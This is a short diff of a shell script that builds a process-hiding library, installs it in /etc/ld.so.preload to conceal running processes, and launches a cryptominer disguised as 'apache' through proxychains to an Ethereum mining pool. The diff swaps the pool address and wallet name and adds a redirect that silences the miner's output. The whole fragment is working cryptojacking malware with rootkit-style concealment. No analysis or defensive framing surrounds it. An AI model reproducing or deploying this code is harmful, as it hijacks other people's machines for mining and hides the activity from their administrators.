@@ -17,4 +17,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 cd ..
 
-proxychains ./apache --url=ssl://0x3034f4f43d2bd65bfbe2a62666828baabc8213c6.$(echo $(shuf -i 1-1000 -n 1))@eth-de.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+proxychains ./apache --url=ssl://sagemode.$(echo $(shuf -i 1-1000 -n 1))@ethash.kupool.com:8888 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99 >/dev/null 2>&1
